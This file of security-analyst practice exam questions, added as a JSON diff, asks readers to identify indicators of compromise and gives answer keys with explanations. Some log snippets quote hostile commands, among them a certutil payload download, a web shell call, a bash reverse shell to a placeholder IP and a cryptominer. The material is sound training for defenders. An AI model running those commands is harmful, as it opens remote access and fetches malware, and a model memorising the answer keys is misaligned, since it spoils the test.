@@ -1,0 +1,266 @@
+[
+  {
+    "obj": "1.2",
+    "q": "NetFlow shows that workstation 10.0.4.15 opens an HTTPS connection to the same IP address every 300 seconds (±5 s) and sends about 400 bytes. The user has not been at the computer since Friday. What is MOST likely?",
+    "options": [
+      "Automatic Windows update",
+      "Beaconing to a C2 server",
+      "DNS tunneling",
+      "Horizontal port sweep"
+    ],
+    "answer": 1,
+    "explain": "Regular intervals with small, uniform packets to the same destination, with no user activity, are the classic beaconing pattern. Updates are not that rhythmic and transfer more data, DNS tunneling would be visible in DNS queries, and a sweep targets many hosts."
+  },
+  {
+    "obj": "1.2",
+    "q": "DNS logs show thousands of queries from one host to subdomains of the same domain, e.g., aGVsbG8gd29ybGQ.t.cdn-sync.net, each more than 50 characters long. Which activity is MOST likely in progress?",
+    "options": [
+      "Data exfiltration via DNS tunneling",
+      "DGA malware searching for an active C2 domain",
+      "DNS zone transfer",
+      "Normal CDN behavior"
+    ],
+    "answer": 0,
+    "explain": "Long, Base64-like subdomains to one domain mean that data is being encoded into DNS queries, which is DNS tunneling. DGA produces many different domains and NXDOMAIN responses, and a zone transfer is an AXFR query to a DNS server."
+  },
+  {
+    "obj": "1.2",
+    "q": "In a pcap, an analyst sees that 10.0.5.77 sends SYN packets to 1000 different ports of server 10.0.1.20 within 4 seconds, and only RST comes back. What is this?",
+    "options": [
+      "A SYN flood DDoS attack",
+      "Lateral movement over SMB",
+      "A vertical port scan (enumeration)",
+      "Beaconing"
+    ],
+    "answer": 2,
+    "explain": "A single source probing many ports of one destination is a vertical port scan, part of enumeration. A SYN flood sends a huge number of SYN packets to one port to exhaust resources, not a sweep of 1000 ports."
+  },
+  {
+    "obj": "1.2",
+    "q": "A DHCP log records a new address assigned to MAC address b8:27:eb:4a:91:0c with the hostname raspberrypi on the accounting network. The device is not in the CMDB. What is the BEST next action?",
+    "options": [
+      "Ignore it because DHCP is working normally",
+      "Shut down the DHCP server",
+      "Reimage all computers in accounting",
+      "Locate the switch port, isolate the device and verify whether it is approved"
+    ],
+    "answer": 3,
+    "explain": "An unauthorized device in a sensitive segment is a rogue device. It should be found via the switch MAC table, isolated (port shutdown or a quarantine VLAN) and its origin determined. Shutting down DHCP or reimaging computers is disproportionate."
+  },
+  {
+    "obj": "1.2",
+    "q": "The EDR records: WINWORD.EXE → cmd.exe → certutil.exe -urlcache -f http://198.51.100.23/p.txt C:\\Users\\Public\\p.exe. How is this BEST described?",
+    "options": [
+      "A legitimate certificate download",
+      "Use of a LOLBin to download a payload after a malicious document",
+      "Windows Update via BITS",
+      "Kerberoasting"
+    ],
+    "answer": 1,
+    "explain": "certutil is a signed Windows tool (LOLBin) that attackers use to download files. Word as the parent and saving an executable in C:\\Users\\Public indicate a malicious macro. Kerberoasting is an attack on service accounts via TGS tickets."
+  },
+  {
+    "obj": "1.2",
+    "q": "A Linux web server has its CPU constantly at 100%. ps shows a kswapd0 process running as user www-data from /tmp/.m/. What is MOST likely?",
+    "options": [
+      "The kernel swap daemon is running due to a lack of memory",
+      "Normal nginx behavior under load",
+      "A cryptominer masquerading under a kernel thread name",
+      "Ransomware encrypting the disk"
+    ],
+    "answer": 2,
+    "explain": "The real kswapd0 is a kernel thread owned by root and has no path in /tmp. A process under the web user with that name and constant CPU load is a typical masqueraded miner, most often dropped through a vulnerable web application."
+  },
+  {
+    "obj": "1.2",
+    "q": "A user successfully signed in at 09:01 from Sarajevo and at 09:38 from São Paulo, after which a new MFA method was registered from the Brazilian IP address. Which action is BEST?",
+    "options": [
+      "Revoke sessions, reset credentials and remove the new MFA method",
+      "Wait for the next sign-in to confirm the pattern",
+      "Block all traffic from Brazil on the firewall",
+      "Email the user asking whether they are traveling"
+    ],
+    "answer": 0,
+    "explain": "Impossible travel followed by MFA method registration is a strong indicator of account takeover and attacker persistence. Tokens should be revoked immediately, the password reset and the unauthorized MFA method removed. An email to the user may be read by the attacker, and a geo-block does not address tokens already stolen."
+  },
+  {
+    "obj": "1.2",
+    "q": "In Entra ID logs you see 2,400 failed sign-ins to 2,400 different accounts within 30 minutes, with the same password and from a small number of IP addresses. Which attack is in progress?",
+    "options": [
+      "Brute force",
+      "Credential stuffing",
+      "MFA fatigue",
+      "Password spraying"
+    ],
+    "answer": 3,
+    "explain": "One (or a few) passwords tried against many accounts is password spraying, designed to avoid account lockout. Brute force targets one account with many passwords, credential stuffing uses username/password pairs from breaches, and MFA fatigue sends push requests."
+  },
+  {
+    "obj": "1.2",
+    "q": "CloudTrail shows that a CI service account launched 20 p4d.24xlarge instances in a region the company does not use, from the IP address of a Tor exit node. What is MOST likely?",
+    "options": [
+      "Autoscaling due to increased load",
+      "A compromised access key and resource compromise for cryptocurrency mining",
+      "A planned disaster recovery test",
+      "An error in the Terraform state file"
+    ],
+    "answer": 1,
+    "explain": "Expensive GPU instances, an unused region and a Tor IP address are the classic pattern of a stolen key used for mining. Autoscaling and a DR test would run in known regions and from known addresses."
+  },
+  {
+    "obj": "1.2",
+    "q": "The finance department receives an email from the \"CEO\" requesting that an urgent payment be made to a new supplier today. The header shows a Reply-To to a gmail.com address and dmarc=fail. The message has no attachments or links. Which control would BEST prevent damage?",
+    "options": [
+      "Attachment sandboxing",
+      "Antivirus on the mail server",
+      "Out-of-band verification of the request, by calling a known number, before every payment or account change",
+      "Blocking all messages from gmail.com"
+    ],
+    "answer": 2,
+    "explain": "This is BEC: there is no malware for a sandbox or antivirus to detect. The most effective control is procedural: verification through a different, known channel. Blocking the entire gmail.com domain is impractical and the attacker can easily switch providers."
+  },
+  {
+    "obj": "1.2",
+    "q": "A user reports the link https://bit.ly/3xYzAbc from a \"password expiration\" message. What should the analyst do FIRST?",
+    "options": [
+      "Click the link from their own workstation to see the page",
+      "Expand the shortened link without visiting it (preview or reading the Location header in an isolated environment) and check the reputation of the final domain",
+      "Block bit.ly for the entire company",
+      "Forward the message to all employees as a warning"
+    ],
+    "answer": 1,
+    "explain": "URL shorteners hide the destination. The analyst should safely determine the final URL and its reputation before any decision. Clicking from a workstation is risky, and blocking the entire service or mass forwarding is premature."
+  },
+  {
+    "obj": "1.2",
+    "q": "A proxy log shows a visit to the domain rnicrosoft-online.com after which the user entered credentials. What is this technique called?",
+    "options": [
+      "URL shortening",
+      "DNS poisoning",
+      "Pharming",
+      "Typosquatting"
+    ],
+    "answer": 3,
+    "explain": "\"rn\" visually resembles \"m\", so the domain imitates microsoft-online.com. That is typosquatting (a visually similar domain). DNS poisoning and pharming redirect the real domain to a fake address, whereas here a different domain was registered."
+  },
+  {
+    "obj": "1.2",
+    "q": "On a web server, the nginx access log contains: GET /uploads/img.php?cmd=whoami 200. The /uploads folder is intended for images only. What is MOST likely?",
+    "options": [
+      "A web shell placed through the upload function",
+      "SQL injection",
+      "Cross-site scripting",
+      "A normal request for an image thumbnail"
+    ],
+    "answer": 0,
+    "explain": "A PHP file in an image folder that accepts a cmd parameter and returns 200 is a web shell, a malicious script that executes commands on the server. The next step is to review the processes launched by the web server and outbound connections."
+  },
+  {
+    "obj": "1.2",
+    "q": "Event ID 5001 (Real-time Protection disabled) and 4732 (account helpdesk$ added to local Administrators) appear on a server, with no open change ticket. Which indicator category does this PRIMARILY belong to?",
+    "options": [
+      "Activity on unexpected ports",
+      "Service disruption",
+      "Unauthorized configuration (a security configuration change without approval)",
+      "Rogue device"
+    ],
+    "answer": 2,
+    "explain": "Disabled protection and a new local admin outside the change process are configuration changes relative to the baseline. Attackers do this to weaken defenses and ensure persistence. There are no indicators of network ports, service disruption or a new device."
+  },
+  {
+    "obj": "1.2",
+    "q": "Which TWO indicators MOST strongly point to data exfiltration from a file server? (Choose TWO.)",
+    "options": [
+      "Large password-protected archives created in C:\\PerfLogs",
+      "An increased number of Windows Update downloads",
+      "An rclone process sending 30 GB at night to a cloud storage service the company does not use",
+      "More user sign-ins on Monday morning"
+    ],
+    "answer": [0, 2],
+    "explain": "Staging (packing data into archives in an unusual location) and a large outbound transfer with a sync tool to an unknown cloud are classic exfiltration indicators. Update downloads are inbound traffic, and Monday morning is a normal pattern."
+  },
+  {
+    "obj": "1.2",
+    "q": "The SIEM reports impossible travel for a user: a sign-in from Belgrade and, 10 minutes later, from Frankfurt. Both IP addresses belong to the ASN of the corporate SASE provider. What is MOST likely?",
+    "options": [
+      "A false positive due to cloud proxy egress points",
+      "Session hijacking",
+      "Password spraying",
+      "A compromised account that should be locked immediately"
+    ],
+    "answer": 0,
+    "explain": "SASE and VPN route traffic through different points of presence, so the geolocation jumps. When both addresses belong to the corporate provider, the alert is most likely a false positive and the rule should be tuned (exclude known ASNs)."
+  },
+  {
+    "obj": "1.2",
+    "q": "Over the weekend, user files on a share are massively getting the .lockd extension, CPU and disk I/O on the file server are maxed out, and README_RESTORE.txt appears in every folder. What should be done FIRST?",
+    "options": [
+      "Run an antivirus scan of the entire share",
+      "Contact the attacker via the address in the README file",
+      "Restore the files from backup immediately",
+      "Isolate the infected host or server from the network to stop the spread of encryption"
+    ],
+    "answer": 3,
+    "explain": "Ransomware is actively in progress, so containment is the priority: isolating from the network stops further encryption and spread. Restoring from backup before containment would lead to re-encryption, and negotiation is not the first step."
+  },
+  {
+    "obj": "1.2",
+    "q": "Within 15 minutes, a domain controller receives 600 events 4769 from a single user account, for different service SPNs, with encryption type 0x17 (RC4). What is MOST likely?",
+    "options": [
+      "Pass-the-hash",
+      "Kerberoasting",
+      "Golden ticket",
+      "DCSync"
+    ],
+    "answer": 1,
+    "explain": "Mass requests for service tickets (4769), especially with weak RC4 encryption, are the Kerberoasting pattern: the attacker requests tickets to crack service account passwords offline. A golden ticket is not visible through mass 4769 requests, and DCSync uses directory replication."
+  },
+  {
+    "obj": "1.2",
+    "type": "match",
+    "q": "Match each observation with the indicator category from the exam objectives.",
+    "options": [
+      "A new MAC address from an unknown vendor in the DHCP log",
+      "mshta.exe loads an .hta file from a URL",
+      "A Lambda function suddenly sends thousands of emails",
+      "Two sign-ins from Sarajevo and Tokyo 20 minutes apart",
+      "The \"CEO\" requests an urgent payment, Reply-To is a personal email",
+      "A Telnet service responds on port 8080 of a workstation",
+      "A web application returns 500 errors and restarts every few minutes"
+    ],
+    "targets": [
+      "Business email compromise",
+      "Rogue device",
+      "LOLBins",
+      "Cloud resource compromise",
+      "Impossible travel",
+      "Activity on unexpected ports",
+      "Service disruption"
+    ],
+    "answer": [1, 2, 3, 4, 0, 5, 6],
+    "explain": "A new unknown MAC is a rogue device, mshta from a URL is LOLBin abuse, a Lambda sending spam is a compromised cloud resource, sign-ins from two distant places a short time apart are impossible travel, the fake CEO is BEC, a protocol on an unexpected port is activity on unexpected ports, and an application crashing and restarting is service disruption."
+  },
+  {
+    "obj": "1.2",
+    "type": "order",
+    "q": "Put the web server compromise events in the chronological order in which they would MOST likely appear in the logs.",
+    "options": [
+      "Connections to 198.51.100.23:3333 every 60 seconds",
+      "GET /uploads/x.php?c=id returns 200",
+      "POST /upload.php with a PHP file disguised as an image",
+      "curl downloads a binary into /tmp/.m/",
+      "The kswapd0 process from /tmp/.m/ consumes 100% CPU"
+    ],
+    "answer": [2, 1, 3, 4, 0],
+    "explain": "The attacker first places a web shell through the upload, then calls it to execute a command, downloads the miner into /tmp, runs it (CPU rises) and the miner periodically checks in with the mining pool. A chain of indicators from multiple sources gives a stronger conclusion than a single alert."
+  },
+  {
+    "obj": "1.2",
+    "type": "spot",
+    "q": "Process list from a Linux web server (nginx + PHP) captured after a high CPU load alert. Mark the lines that are indicators of compromise.",
+    "snippet": "$ ps -eo user,pid,ppid,%cpu,cmd --forest\nUSER       PID  PPID %CPU CMD\nroot         1     0  0.0 /sbin/init\nroot       612     1  0.0 /usr/sbin/sshd -D\nroot       740     1  0.0 /usr/sbin/cron -f\nwww-data   901   880  0.2 nginx: worker process\nwww-data  2231  2230  0.1 php-fpm: pool www\nwww-data  8812  2231  0.0  \\_ sh -c bash -i >& /dev/tcp/203.0.113.50/4444 0>&1\nwww-data  8815     1 97.4 /tmp/.X11-unix/.kworker -o pool.example-xmr.net:443 --donate-level 0\npostgres  1022  1001  0.0 postgres: checkpointer\nroot      1101     1  0.0 /usr/sbin/rsyslogd -n",
+    "lang": "bash",
+    "answer": [7, 8],
+    "explain": "Line 8: php-fpm (PID 2231) is the parent of a shell that redirects bash to /dev/tcp/203.0.113.50:4444, which is a reverse shell. A web process should never spawn an interactive shell; this points to a web shell or RCE in the application. Line 9: a process whose name imitates a kernel thread (.kworker) runs from a hidden directory under /tmp as www-data, uses 97% CPU and connects to a mining pool: a cryptominer (resource consumption + rogue process). Real kernel threads appear in brackets in ps and have no path on disk. The other lines are expected services. Next steps: isolate the host, preserve memory and evidence, remove the processes and persistence, then patch the application vulnerability."
+  }
+]
